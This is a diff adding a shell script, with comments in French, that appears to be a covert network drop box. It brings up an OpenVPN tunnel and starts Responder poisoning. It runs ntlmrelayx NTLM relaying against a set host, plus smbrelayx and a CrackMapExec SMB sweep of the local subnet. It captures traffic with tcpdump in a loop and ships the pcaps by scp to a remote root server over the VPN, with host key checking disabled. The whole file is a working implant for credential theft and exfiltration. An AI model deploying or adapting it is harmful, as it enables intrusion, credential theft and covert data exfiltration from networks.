@@ -1,1 +1,66 @@
+#!/bin/sh
 
+USB_PATH="/mnt/usb"
+LOG_DIR="$USB_PATH/logs"
+VPN_CONF="$USB_PATH/squirrel.ovpn"
+INTERVAL_HOURS=12  # Fréquence des rapports
+
+# Infos transfert VPN
+REMOTE_USER="root"
+REMOTE_IP="10.8.0.1"
+REMOTE_DIR="/root/pcap-analyzer/data"
+KEY_PATH="/root/squirrel_key"  # Clé privée déjà copiée avec chmod 600
+
+# ========== MONTAGE CLE USB ==========
+# mkdir -p $USB_PATH
+# mount | grep -q "$USB_PATH" || mount /dev/sdb1 $USB_PATH
+
+# ========== DÉMARRAGE VPN ==========
+pgrep openvpn > /dev/null || openvpn --config "$VPN_CONF" --daemon
+sleep 15
+
+# ========== DOSSIERS ==========
+mkdir -p "$LOG_DIR/responder" "$LOG_DIR/impacket" "$LOG_DIR/cme"
+
+# ========== OUTILS EN ARRIÈRE-PLAN ==========
+echo "[+] Lancement de Responder"
+Responder -I eth0 -wFb -v > "$LOG_DIR/responder/responder.log" 2>&1 &
+
+echo "[+] Lancement de ntlmrelayx"
+ntlmrelayx.py -t smb://192.168.1.10 -smb2support --no-http-server > "$LOG_DIR/impacket/ntlmrelayx.log" 2>&1 &
+
+echo "[+] Lancement de smbrelayx"
+smbrelayx.py -h > "$LOG_DIR/impacket/smbrelayx.log" 2>&1 &
+
+echo "[+] Scan initial avec CrackMapExec"
+crackmapexec smb 192.168.1.0/24 > "$LOG_DIR/cme/initial_scan.log" 2>&1 &
+
+# ========== BOUCLE DE CAPTURE ==========
+while true; do
+    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+    PCAP_FILE="$LOG_DIR/capture_$TIMESTAMP.pcap"
+    REPORT_FILE="$LOG_DIR/report_$TIMESTAMP.txt"
+
+    echo "[+] Démarrage capture à $TIMESTAMP"
+    tcpdump -i eth0 -w "$PCAP_FILE" -G $((INTERVAL_HOURS * 3600)) -W 1
+
+    echo "==== RAPPORT DE CAPTURE ====" > "$REPORT_FILE"
+    echo "Date        : $(date)" >> "$REPORT_FILE"
+    echo "Fichier pcap: $PCAP_FILE" >> "$REPORT_FILE"
+    echo "Durée       : $INTERVAL_HOURS heures" >> "$REPORT_FILE"
+    echo "Interface   : eth0" >> "$REPORT_FILE"
+    echo "VPN         : $(pgrep -f openvpn > /dev/null && echo 'Actif' || echo 'Inactif')" >> "$REPORT_FILE"
+    echo "Outils      : Responder, ntlmrelayx, smbrelayx, CME" >> "$REPORT_FILE"
+
+    # Vérification de la connexion SSH avant transfert
+    echo "[+] Vérification de la connexion SSH avant transfert..."
+    if ssh -i "$KEY_PATH" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$REMOTE_USER@$REMOTE_IP" "echo OK"; then
+        echo "[+] SSH OK, transfert en cours..."
+        scp -i "$KEY_PATH" -o StrictHostKeyChecking=no "$PCAP_FILE" "$REMOTE_USER@$REMOTE_IP:$REMOTE_DIR"
+    else
+        echo "[!] Échec SSH, tentative ignorée pour éviter blocage."
+    fi
+
+    sync
+    sleep 30
+done
